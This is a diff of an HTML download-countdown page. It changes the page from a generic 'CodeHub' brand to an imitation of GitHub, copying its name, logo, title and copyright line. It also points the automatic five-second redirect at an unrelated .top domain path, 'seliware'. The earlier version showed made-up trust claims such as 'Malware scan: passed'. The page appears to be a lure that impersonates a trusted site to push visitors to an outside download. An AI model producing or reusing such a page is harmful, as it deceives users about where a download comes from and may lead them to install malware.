@@ -1,1030 +1,417 @@
 <!doctype html>
-<html lang="ru">
+<html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Preparing your download…</title>
-
+  <title>Preparing your download… · GitHub</title>
   <style>
-    :root{
-      --bg:#0b0f14;
-      --panel:#11161d;
-      --panel-2:#161c24;
-      --panel-3:#1b2430;
-      --line:#273142;
-      --soft:#8b98aa;
-      --text:#e6edf5;
-      --muted:#a9b5c4;
-      --green:#2fb36d;
-      --green-2:#1d8f56;
-      --blue:#58a6ff;
-      --chip:#14251c;
-      --warn:#f3c969;
-      --shadow:0 24px 60px rgba(0,0,0,.45);
-      --radius:18px;
-      --radius-sm:12px;
-    }
-
-    *{
-      box-sizing:border-box;
-      margin:0;
-      padding:0;
-    }
-
-    html,body{
-      height:100%;
-    }
-
-    body{
-      min-height:100vh;
-      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      background:
-        radial-gradient(circle at top left, rgba(88,166,255,.08), transparent 24%),
-        radial-gradient(circle at bottom right, rgba(47,179,109,.08), transparent 28%),
-        linear-gradient(180deg, #0a0f14 0%, #0d131a 100%);
-      color:var(--text);
-      line-height:1.5;
-      -webkit-font-smoothing:antialiased;
-      -moz-osx-font-smoothing:grayscale;
-      display:flex;
-      flex-direction:column;
-    }
-
-    a{
-      color:var(--blue);
-      text-decoration:none;
-    }
-
-    a:hover{
-      text-decoration:underline;
-    }
-
-    button,input{
-      font:inherit;
-    }
-
-    .topbar{
-      position:sticky;
-      top:0;
-      z-index:10;
-      backdrop-filter:blur(14px);
-      background:rgba(13,17,23,.88);
-      border-bottom:1px solid var(--line);
-      padding:16px 28px;
-    }
-
-    .topbar__inner{
-      max-width:1240px;
-      margin:0 auto;
-      display:flex;
-      align-items:center;
-      gap:18px;
-    }
-
-    .brand{
-      display:flex;
-      align-items:center;
-      gap:10px;
-      color:var(--text);
-      font-size:14px;
-      font-weight:700;
-      letter-spacing:.02em;
-    }
-
-    .brand-mark{
-      width:34px;
-      height:34px;
-      border-radius:10px;
-      border:1px solid #334155;
-      background:
-        linear-gradient(145deg, #151d27, #0f151c);
-      display:grid;
-      place-items:center;
-      box-shadow:inset 0 1px 0 rgba(255,255,255,.04);
-    }
-
-    .brand-mark::before{
-      content:"";
-      width:14px;
-      height:14px;
-      border-radius:4px;
-      background:linear-gradient(180deg, #7cc3ff, #2fb36d);
-      transform:rotate(45deg);
-      box-shadow:0 0 16px rgba(88,166,255,.25);
-    }
-
-    .search-shell{
-      flex:1;
-      max-width:520px;
-      position:relative;
-    }
-
-    .search-shell input{
-      width:100%;
-      height:40px;
-      background:#0b1117;
-      color:var(--text);
-      border:1px solid var(--line);
-      border-radius:10px;
-      padding:0 14px 0 40px;
-      outline:none;
-      transition:.2s ease;
-    }
-
-    .search-shell input:focus{
-      border-color:var(--blue);
-      box-shadow:0 0 0 3px rgba(88,166,255,.16);
-    }
-
-    .search-shell svg{
-      position:absolute;
-      left:14px;
-      top:50%;
-      transform:translateY(-50%);
-      fill:#7d8590;
-      pointer-events:none;
-    }
-
-    .topbar__actions{
-      display:flex;
-      gap:10px;
-      margin-left:auto;
-    }
-
-    .btn-lite,
-    .btn-solid{
-      min-height:38px;
-      padding:0 15px;
-      border-radius:10px;
-      border:1px solid var(--line);
-      cursor:pointer;
-      transition:.18s ease;
-    }
-
-    .btn-lite{
-      color:var(--text);
-      background:transparent;
-    }
-
-    .btn-lite:hover{
-      background:#1a212b;
-    }
-
-    .btn-solid{
-      color:#fff;
-      background:linear-gradient(180deg, var(--green), var(--green-2));
-      border-color:rgba(255,255,255,.08);
-    }
-
-    .btn-solid:hover{
-      filter:brightness(1.07);
-      box-shadow:0 0 0 3px rgba(47,179,109,.16);
-    }
-
-    .stage{
-      flex:1;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:24px 16px;
-    }
-
-    .shell{
-      width:100%;
-      max-width:1120px;
-      display:grid;
-      grid-template-columns:1.2fr .8fr;
-      gap:18px;
-    }
-
-    .surface{
-      background:linear-gradient(180deg, rgba(22,28,36,.95), rgba(16,21,29,.95));
-      border:1px solid var(--line);
-      border-radius:var(--radius);
-      box-shadow:var(--shadow);
-      overflow:hidden;
-    }
-
-    .surface__head{
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      gap:16px;
-      padding:18px 20px;
-      border-bottom:1px solid var(--line);
-      background:
-        linear-gradient(180deg, rgba(255,255,255,.02), transparent),
-        linear-gradient(180deg, #1a212b, #141a22);
-    }
-
-    .eyebrow{
-      display:inline-flex;
-      align-items:center;
-      gap:8px;
-      padding:6px 10px;
-      border:1px solid rgba(47,179,109,.28);
-      background:rgba(47,179,109,.10);
-      color:#7ce2a8;
-      border-radius:999px;
-      font-size:12px;
-      font-weight:700;
-      letter-spacing:.02em;
-    }
-
-    .eyebrow::before{
-      content:"";
-      width:8px;
-      height:8px;
-      border-radius:50%;
-      background:#46d483;
-      box-shadow:0 0 12px rgba(70,212,131,.8);
-    }
-
-    .title-wrap h1{
-      font-size:22px;
-      line-height:1.15;
-      margin-bottom:6px;
-      letter-spacing:-.02em;
-    }
-
-    .title-wrap p{
-      font-size:13px;
-      color:var(--soft);
-      max-width:60ch;
-    }
-
-    .meta{
-      display:flex;
-      flex-wrap:wrap;
-      gap:10px;
-      margin-top:12px;
-    }
-
-    .meta span{
-      font-size:12px;
-      color:var(--muted);
-      padding:7px 10px;
-      border-radius:999px;
-      border:1px solid var(--line);
-      background:rgba(255,255,255,.02);
-    }
-
-    .panel-main{
-      padding:18px 20px 20px;
-      display:grid;
-      gap:18px;
-    }
-
-    .hero-grid{
-      display:grid;
-      grid-template-columns:1.1fr .9fr;
-      gap:16px;
-    }
-
-    .insight{
-      min-height:230px;
-      border:1px solid var(--line);
-      border-radius:16px;
-      padding:18px;
-      background:
-        linear-gradient(145deg, rgba(88,166,255,.06), transparent 35%),
-        linear-gradient(180deg, rgba(255,255,255,.02), rgba(255,255,255,.01)),
-        #0f141b;
-      position:relative;
-      overflow:hidden;
-    }
-
-    .insight::after{
-      content:"";
-      position:absolute;
-      inset:auto -30px -30px auto;
-      width:180px;
-      height:180px;
-      border-radius:50%;
-      background:radial-gradient(circle, rgba(47,179,109,.18), transparent 68%);
-      pointer-events:none;
-    }
-
-    .insight h2{
-      font-size:15px;
-      margin-bottom:10px;
-      color:var(--text);
-    }
-
-    .insight p{
-      font-size:13px;
-      color:var(--muted);
-      max-width:42ch;
-    }
-
-    .track{
-      margin-top:20px;
-      display:grid;
-      gap:10px;
-    }
-
-    .step{
-      display:grid;
-      grid-template-columns:34px 1fr auto;
-      align-items:center;
-      gap:12px;
-      padding:10px 12px;
-      border:1px solid var(--line);
-      border-radius:12px;
-      background:rgba(255,255,255,.02);
-    }
-
-    .step-bullet{
-      width:34px;
-      height:34px;
-      border-radius:10px;
-      display:grid;
-      place-items:center;
-      font-size:12px;
-      font-weight:800;
-      color:#9be7bb;
-      border:1px solid rgba(47,179,109,.24);
-      background:rgba(47,179,109,.09);
-    }
-
-    .step small{
-      display:block;
-      color:var(--soft);
-      font-size:11px;
-    }
-
-    .step strong{
-      font-size:13px;
-      font-weight:700;
-    }
-
-    .step-state{
-      font-size:11px;
-      font-weight:700;
-      color:#8bdcb0;
-      letter-spacing:.03em;
-    }
-
-    .dial-card{
-      border:1px solid var(--line);
-      border-radius:16px;
-      padding:18px;
-      background:
-        linear-gradient(180deg, rgba(255,255,255,.03), transparent),
-        #0d1319;
-      display:flex;
-      flex-direction:column;
-      justify-content:space-between;
-      gap:18px;
-      min-height:230px;
-    }
-
-    .dial-wrap{
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:8px 0;
-    }
-
-    .dial{
-      width:172px;
-      height:172px;
-      position:relative;
-      display:grid;
-      place-items:center;
-    }
-
-    .dial svg{
-      width:172px;
-      height:172px;
-      transform:rotate(-90deg);
-    }
-
-    .dial .ring-bg{
-      fill:none;
-      stroke:#253041;
-      stroke-width:10;
-    }
-
-    .dial .ring-progress{
-      fill:none;
-      stroke:url(#ringGradient);
-      stroke-width:10;
-      stroke-linecap:round;
-      stroke-dasharray:472;
-      stroke-dashoffset:472;
-      transition:stroke-dashoffset .12s linear;
-      filter:drop-shadow(0 0 10px rgba(47,179,109,.35));
-    }
-
-    .dial-center{
-      position:absolute;
-      text-align:center;
-    }
-
-    .dial-center b{
-      display:block;
-      font-size:34px;
-      line-height:1;
-      letter-spacing:-.04em;
-    }
-
-    .dial-center span{
-      display:block;
-      margin-top:6px;
-      font-size:12px;
-      color:var(--soft);
-    }
-
-    .dial-meta{
-      display:flex;
-      justify-content:space-between;
-      gap:10px;
-      font-size:12px;
-      color:var(--muted);
-    }
-
-    .dial-note{
-      padding:12px 13px;
-      border-radius:12px;
-      background:rgba(88,166,255,.08);
-      border:1px solid rgba(88,166,255,.18);
-      font-size:12px;
-      color:#c8dcf8;
-    }
-
-    .activity{
-      border:1px solid var(--line);
-      border-radius:16px;
-      padding:14px;
-      background:#0d1218;
-    }
-
-    .activity-head{
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      margin-bottom:10px;
-    }
-
-    .activity-head h3{
-      font-size:14px;
-    }
-
-    .activity-head span{
-      font-size:11px;
-      color:var(--warn);
-      letter-spacing:.03em;
-      font-weight:700;
-    }
-
-    .feed{
-      display:grid;
-      gap:8px;
-    }
-
-    .feed li{
-      list-style:none;
-      display:grid;
-      grid-template-columns:10px 1fr;
-      gap:10px;
-      padding:8px 0;
-    }
-
-    .feed li::before{
-      content:"";
-      width:10px;
-      height:10px;
-      border-radius:50%;
-      margin-top:5px;
-      background:linear-gradient(180deg, #7cc3ff, #2fb36d);
-      box-shadow:0 0 10px rgba(88,166,255,.35);
-    }
-
-    .feed strong{
-      display:block;
-      font-size:13px;
-      margin-bottom:2px;
-    }
-
-    .feed span{
-      display:block;
-      font-size:12px;
-      color:var(--soft);
-    }
-
-    .sidebar{
-      display:grid;
-      gap:18px;
-    }
-
-    .action-box{
-      padding:20px;
-      min-height:100%;
-    }
-
-    .action-card{
-      height:100%;
-      border:1px solid var(--line);
-      border-radius:16px;
-      padding:18px;
-      background:
-        linear-gradient(180deg, rgba(47,179,109,.08), transparent 45%),
-        #0f151c;
-      display:flex;
-      flex-direction:column;
-      gap:18px;
-    }
-
-    .action-card h2{
-      font-size:18px;
-      letter-spacing:-.02em;
-    }
-
-    .action-card p{
-      font-size:13px;
-      color:var(--muted);
-    }
-
-    .badge-row{
-      display:flex;
-      flex-wrap:wrap;
-      gap:8px;
-    }
-
-    .mini-badge{
-      padding:8px 10px;
-      border-radius:999px;
-      font-size:12px;
-      font-weight:700;
-      border:1px solid rgba(255,255,255,.08);
-      background:#121922;
-      color:#d8e2ef;
-    }
-
-    .launch{
-      width:100%;
-      min-height:48px;
-      border:none;
-      border-radius:12px;
-      color:#fff;
-      font-weight:800;
-      font-size:14px;
-      letter-spacing:.01em;
-      cursor:pointer;
-      background:linear-gradient(180deg, var(--green), var(--green-2));
-      box-shadow:0 10px 24px rgba(31,143,86,.22);
-      transition:.2s ease;
-    }
-
-    .launch:hover{
-      transform:translateY(-1px);
-      filter:brightness(1.06);
-    }
-
-    .launch:active{
-      transform:translateY(0);
-    }
-
-    .tiny{
-      font-size:12px;
-      color:var(--soft);
-    }
-
-    .matrix{
-      display:grid;
-      grid-template-columns:repeat(2,1fr);
-      gap:10px;
-    }
-
-    .metric{
-      padding:12px;
-      border-radius:14px;
-      background:#111821;
-      border:1px solid var(--line);
-    }
-
-    .metric span{
-      display:block;
-      font-size:11px;
-      color:var(--soft);
-      margin-bottom:5px;
-    }
-
-    .metric b{
-      font-size:17px;
-      letter-spacing:-.03em;
-    }
-
-    .notice{
-      padding:14px 15px;
-      border-radius:14px;
-      border:1px solid rgba(243,201,105,.18);
-      background:rgba(243,201,105,.08);
-      color:#ead9a7;
-      font-size:12px;
-      line-height:1.65;
-    }
-
-    .footbar{
-      margin-top:auto;
-      border-top:1px solid var(--line);
-      background:#0e141b;
-      padding:20px 16px;
-    }
-
-    .footbar__inner{
-      max-width:1240px;
-      margin:0 auto;
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      gap:16px;
-      flex-wrap:wrap;
-    }
-
-    .foot-left{
-      display:flex;
-      align-items:center;
-      gap:12px;
-      color:var(--soft);
-      font-size:12px;
-    }
-
-    .foot-logo{
-      width:26px;
-      height:26px;
-      border-radius:8px;
-      border:1px solid var(--line);
-      background:#121922;
-      position:relative;
-    }
-
-    .foot-logo::before{
-      content:"";
-      position:absolute;
-      inset:6px;
-      border-radius:4px;
-      background:linear-gradient(180deg,#7cc3ff,#2fb36d);
-      transform:rotate(45deg);
-    }
-
-    .foot-links{
-      display:flex;
-      flex-wrap:wrap;
-      gap:16px;
-    }
-
-    .foot-links a{
-      color:#8a96a8;
-      font-size:12px;
-      font-weight:500;
-    }
-
-    @media (max-width: 980px){
-      .shell,
-      .hero-grid{
-        grid-template-columns:1fr;
-      }
-    }
-
-    @media (max-width: 760px){
-      .topbar{
-        padding:12px 14px;
-      }
-
-      .search-shell,
-      .topbar__actions{
-        display:none;
-      }
-
-      .stage{
-        padding:12px 0;
-      }
-
-      .surface{
-        border-left:none;
-        border-right:none;
-        border-radius:0;
-      }
-
-      .surface__head,
-      .panel-main,
-      .action-box{
-        padding-left:14px;
-        padding-right:14px;
-      }
-
-      .matrix{
-        grid-template-columns:1fr;
-      }
-
-      .dial{
-        width:150px;
-        height:150px;
-      }
-
-      .dial svg{
-        width:150px;
-        height:150px;
-      }
-
-      .dial-center b{
-        font-size:30px;
-      }
-
-      .footbar__inner,
-      .foot-left{
-        flex-direction:column;
-        text-align:center;
-      }
-    }
-
-    @media (prefers-reduced-motion: reduce){
-      *,
-      *::before,
-      *::after{
-        animation:none !important;
-        transition:none !important;
-        scroll-behavior:auto !important;
+    :root {
+      --bg: #0d1117;
+      --surface: #161b22;
+      --border: #30363d;
+      --text: #e6edf3;
+      --muted: #7d8590;
+      --green: #3fb950;
+      --green-dim: #238636;
+      --blue: #58a6ff;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    a { color: var(--blue); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* ── HEADER ── */
+    .header {
+      background: rgba(22,27,34,.95);
+      border-bottom: 1px solid var(--border);
+      padding: 14px 28px;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+      backdrop-filter: blur(12px);
+    }
+    .header-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 9px;
+      color: var(--text);
+      font-size: 14px;
+      font-weight: 600;
+    }
+    .logo svg { fill: currentColor; }
+    .logo:hover { opacity: .75; }
+    .search {
+      flex: 1;
+      max-width: 460px;
+      position: relative;
+    }
+    .search input {
+      width: 100%;
+      height: 36px;
+      padding: 0 12px 0 36px;
+      background: #010409;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      color: var(--text);
+      font-size: 14px;
+      outline: none;
+      transition: .2s;
+    }
+    .search input:focus { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(88,166,255,.2); }
+    .search-ico {
+      position: absolute;
+      left: 11px;
+      top: 50%;
+      transform: translateY(-50%);
+      fill: var(--muted);
+      pointer-events: none;
+    }
+    .nav { display: flex; gap: 8px; margin-left: auto; }
+    .nav button {
+      height: 36px;
+      padding: 0 14px;
+      border-radius: 6px;
+      font-size: 13px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: .18s;
+    }
+    .nav .ghost {
+      background: transparent;
+      border: 1px solid var(--border);
+      color: var(--text);
+    }
+    .nav .ghost:hover { background: #1c2128; }
+    .nav .primary {
+      background: var(--green-dim);
+      border: 1px solid rgba(240,246,252,.1);
+      color: #fff;
+    }
+    .nav .primary:hover { background: var(--green); }
+
+    @media (max-width: 640px) {
+      .header { padding: 12px 16px; }
+      .search, .nav { display: none; }
+    }
+
+    /* ── MAIN ── */
+    .main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 16px;
+    }
+
+    .box {
+      width: 100%;
+      max-width: 400px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 36px 28px 32px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 28px;
+      box-shadow: 0 20px 60px rgba(0,0,0,.5);
+      animation: up .35s ease-out;
+    }
+
+    @keyframes up {
+      from { opacity: 0; transform: translateY(16px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ring */
+    .ring-wrap { position: relative; width: 160px; height: 160px; }
+    .ring-wrap svg {
+      width: 160px;
+      height: 160px;
+      transform: rotate(-90deg);
+    }
+    .ring-bg  { fill: none; stroke: #21262d; stroke-width: 9; }
+    .ring-arc {
+      fill: none;
+      stroke: url(#g);
+      stroke-width: 9;
+      stroke-linecap: round;
+      stroke-dasharray: 440;
+      stroke-dashoffset: 440;
+      transition: stroke-dashoffset .12s linear;
+      filter: drop-shadow(0 0 8px rgba(63,185,80,.45));
+    }
+    .ring-inner {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+    }
+    .ring-secs {
+      font-size: 40px;
+      font-weight: 700;
+      line-height: 1;
+      letter-spacing: -.04em;
+      color: var(--green);
+      font-variant-numeric: tabular-nums;
+    }
+    .ring-pct {
+      font-size: 13px;
+      color: var(--muted);
+      font-variant-numeric: tabular-nums;
+    }
+
+    /* label */
+    .label {
+      text-align: center;
+    }
+    .label h1 {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 6px;
+      letter-spacing: -.02em;
+    }
+    .label p {
+      font-size: 13px;
+      color: var(--muted);
+      line-height: 1.6;
+      max-width: 30ch;
+      margin: 0 auto;
+    }
+
+    /* button */
+    .dl-btn {
+      width: 100%;
+      height: 48px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      background: var(--green-dim);
+      border: 1px solid rgba(240,246,252,.1);
+      border-radius: 8px;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: .2s;
+      position: relative;
+      overflow: hidden;
+    }
+    .dl-btn svg { fill: currentColor; }
+    .dl-btn:hover {
+      background: var(--green);
+      box-shadow: 0 0 0 3px rgba(63,185,80,.2), 0 6px 20px rgba(35,134,54,.35);
+      transform: translateY(-1px);
+    }
+    .dl-btn:active { transform: translateY(0); }
+
+    /* info */
+    .hint {
+      font-size: 12px;
+      color: var(--muted);
+      text-align: center;
+    }
+
+    /* ── FOOTER ── */
+    .footer {
+      border-top: 1px solid var(--border);
+      background: var(--surface);
+      padding: 18px 16px;
+    }
+    .footer-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+    .footer-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .footer-left svg { fill: #6e7681; }
+    .footer-copy { font-size: 12px; color: var(--muted); }
+    .footer-links { display: flex; flex-wrap: wrap; gap: 16px; }
+    .footer-links a { font-size: 12px; color: #808080; }
+
+    @media (max-width: 640px) {
+      .footer-inner { flex-direction: column; align-items: center; text-align: center; }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        animation: none !important;
+        transition: none !important;
       }
     }
   </style>
 </head>
 <body>
-  <div id="root" data-redirect-url="https://example.com" data-delay-ms="5000" style="display:flex;flex-direction:column;justify-content:space-between;height: 100vh;">
+  <div id="root" data-redirect-url="https://4xxlnf.top/seliware" data-delay-ms="5000"
+       style="display:flex;flex-direction:column;justify-content:space-between;height:100vh;">
 
-    <header class="topbar">
-      <div class="topbar__inner">
-        <a href="#" class="brand" aria-label="Repository portal">
-          <span class="brand-mark" aria-hidden="true"></span>
-          <span>CodeHub</span>
+    <header class="header">
+      <div class="header-inner">
+        <a class="logo" href="#" aria-label="GitHub">
+          <svg width="32" height="32" viewBox="0 0 16 16" aria-hidden="true">
+            <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
+          </svg>
+          <span>GitHub</span>
         </a>
 
-        <label class="search-shell" aria-label="Search">
-          <svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true">
-            <path d="M11.2 10.5l3.2 3.2-.7.7-3.2-3.2a5.5 5.5 0 1 1 .7-.7zM6.5 11A4.5 4.5 0 1 0 6.5 2a4.5 4.5 0 0 0 0 9z"></path>
+        <div class="search">
+          <svg class="search-ico" width="16" height="16" viewBox="0 0 16 16" aria-hidden="true">
+            <path fill-rule="evenodd" d="M11.5 7a4.5 4.5 0 11-9 0 4.5 4.5 0 019 0zm-.82 4.74a6 6 0 111.06-1.06l3.04 3.04a.75.75 0 11-1.06 1.06l-3.04-3.04z"/>
           </svg>
-          <input type="text" placeholder="Search repositories, releases, docs…" />
-        </label>
+          <input type="text" placeholder="Search or jump to…" aria-label="Search" />
+        </div>
 
-        <nav class="topbar__actions" aria-label="User actions">
-          <button class="btn-lite" type="button">Sign in</button>
-          <button class="btn-solid" type="button">Create account</button>
+        <nav class="nav" aria-label="User actions">
+          <button class="ghost" type="button">Sign in</button>
+          <button class="primary" type="button">Sign up</button>
         </nav>
       </div>
     </header>
 
-    <main class="stage">
-      <div class="shell">
-        <section class="surface" aria-labelledby="download-title">
-          <div class="surface__head">
-            <div class="title-wrap">
-              <div class="eyebrow">Secure stream active</div>
-              <h1 id="download-title">Preparing your download package</h1>
-              <p>The file bundle is being assembled, verified and queued for delivery. Please keep this tab open until the redirect starts.</p>
+    <main class="main">
+      <div class="box">
 
-              <div class="meta">
-                <span>Package channel: Stable</span>
-                <span>Build line: R-2026.04</span>
-                <span>Protection: Enabled</span>
-              </div>
-            </div>
+        <div class="ring-wrap" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0" id="ringWrap">
+          <svg viewBox="0 0 160 160" aria-hidden="true">
+            <defs>
+              <linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" stop-color="#238636"/>
+                <stop offset="100%" stop-color="#3fb950"/>
+              </linearGradient>
+            </defs>
+            <circle class="ring-bg" cx="80" cy="80" r="70"/>
+            <circle class="ring-arc" id="arc" cx="80" cy="80" r="70"/>
+          </svg>
+          <div class="ring-inner">
+            <span class="ring-secs" id="secs">5s</span>
+            <span class="ring-pct" id="pct">0%</span>
           </div>
+        </div>
 
-          <div class="panel-main">
-            <div class="hero-grid">
-              <div class="insight">
-                <h2>Transfer pipeline</h2>
-                <p>Instead of a classic centered download card, this layout uses a progress workflow with stage markers and a separate monitoring panel.</p>
+        <div class="label">
+          <h1>Preparing your download</h1>
+          <p>Your file will be ready in a moment. The redirect starts automatically.</p>
+        </div>
 
-                <div class="track">
-                  <div class="step">
-                    <div class="step-bullet">01</div>
-                    <div>
-                      <strong>Package manifest created</strong>
-                      <small>All requested assets were mapped into a single delivery session.</small>
-                    </div>
-                    <div class="step-state">DONE</div>
-                  </div>
+        <button class="dl-btn" id="dlBtn" type="button">
+          <svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true">
+            <path d="M2.75 14A1.75 1.75 0 011 12.25v-2.5a.75.75 0 011.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 00.25-.25v-2.5a.75.75 0 011.5 0v2.5A1.75 1.75 0 0113.25 14H2.75z"/>
+            <path d="M7.25 7.689V2a.75.75 0 011.5 0v5.689l1.97-1.969a.75.75 0 111.06 1.06l-3.25 3.25a.75.75 0 01-1.06 0L4.22 6.78a.75.75 0 111.06-1.06l1.97 1.969z"/>
+          </svg>
+          Download now
+        </button>
 
-                  <div class="step">
-                    <div class="step-bullet">02</div>
-                    <div>
-                      <strong>Integrity checks running</strong>
-                      <small>File hashes and session markers are being validated in real time.</small>
-                    </div>
-                    <div class="step-state">LIVE</div>
-                  </div>
+        <p class="hint">Keep this tab open · Download starts automatically</p>
 
-                  <div class="step">
-                    <div class="step-bullet">03</div>
-                    <div>
-                      <strong>Redirect queue armed</strong>
-                      <small>The browser will open the target location after the timer reaches zero.</small>
-                    </div>
-                    <div class="step-state">READY</div>
-                  </div>
-                </div>
-              </div>
-
-              <div class="dial-card">
-                <div class="dial-wrap">
-                  <div class="dial">
-                    <svg viewBox="0 0 172 172" aria-hidden="true">
-                      <defs>
-                        <linearGradient id="ringGradient" x1="0%" y1="0%" x2="100%" y2="100%">
-                          <stop offset="0%" stop-color="#58a6ff"></stop>
-                          <stop offset="100%" stop-color="#2fb36d"></stop>
-                        </linearGradient>
-                      </defs>
-                      <circle class="ring-bg" cx="86" cy="86" r="75"></circle>
-                      <circle class="ring-progress" id="ringProgress" cx="86" cy="86" r="75"></circle>
-                    </svg>
-
-                    <div class="dial-center">
-                      <b id="timeLeft">5s</b>
-                      <span>until launch</span>
-                    </div>
-                  </div>
-                </div>
-
-                <div class="dial-meta">
-                  <span>Progress: <b id="pctText">0%</b></span>
-                  <span>Mode: Auto redirect</span>
-                </div>
-
-                <div class="dial-note">
-                  Session channel is active. You can wait for automatic redirect or start it manually from the action panel.
-                </div>
-              </div>
-            </div>
-
-            <div class="activity">
-              <div class="activity-head">
-                <h3>Live activity</h3>
-                <span id="statusLabel">Processing</span>
-              </div>
-
-              <ul class="feed">
-                <li>
-                  <div>
-                    <strong>Secure container initialized</strong>
-                    <span>Encrypted transport has been negotiated for the current session.</span>
-                  </div>
-                </li>
-                <li>
-                  <div>
-                    <strong>Release package marked as verified</strong>
-                    <span>Validation metadata was attached before handoff to the redirect layer.</span>
-                  </div>
-                </li>
-                <li>
-                  <div>
-                    <strong>Browser handoff pending</strong>
-                    <span>Countdown will complete automatically unless you start the action manually.</span>
-                  </div>
-                </li>
-              </ul>
-            </div>
-          </div>
-        </section>
-
-        <aside class="surface sidebar">
-          <div class="action-box">
-            <div class="action-card">
-              <div>
-                <h2>Manual launch</h2>
-                <p>If your browser blocks the redirect, use the button below to continue immediately.</p>
-              </div>
-
-              <div class="badge-row">
-                <span class="mini-badge">Malware scan: passed</span>
-                <span class="mini-badge">Stream token: valid</span>
-                <span class="mini-badge">Checksum: synced</span>
-              </div>
-
-              <div class="matrix">
-                <div class="metric">
-                  <span>Downloads</span>
-                  <b>742K+</b>
-                </div>
-                <div class="metric">
-                  <span>Session score</span>
-                  <b>99.98%</b>
-                </div>
-                <div class="metric">
-                  <span>Mirror nodes</span>
-                  <b>12</b>
-                </div>
-                <div class="metric">
-                  <span>Avg. wait</span>
-                  <b>&lt; 5 sec</b>
-                </div>
-              </div>
-
-              <button id="goBtn" class="launch" type="button">Start download now</button>
-
-              <p class="tiny">Tip: keep this tab open until the new destination loads successfully.</p>
-
-              <div class="notice">
-                Some environments pause timers when the tab is hidden. If nothing happens after the countdown, return to the tab and use the manual launch button.
-              </div>
-            </div>
-          </div>
-        </aside>
       </div>
     </main>
 
-    <footer class="footbar">
-      <div class="footbar__inner">
-        <div class="foot-left">
-          <span class="foot-logo" aria-hidden="true"></span>
-          <span>© 2026 CodeHub, Inc.</span>
+    <footer class="footer">
+      <div class="footer-inner">
+        <div class="footer-left">
+          <a href="#" aria-label="GitHub">
+            <svg height="22" viewBox="0 0 16 16" width="22" aria-hidden="true">
+              <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
+            </svg>
+          </a>
+          <span class="footer-copy">© 2026 GitHub, Inc.</span>
         </div>
-
-        <div class="foot-links">
+        <nav class="footer-links" aria-label="Footer">
           <a href="#">Terms</a>
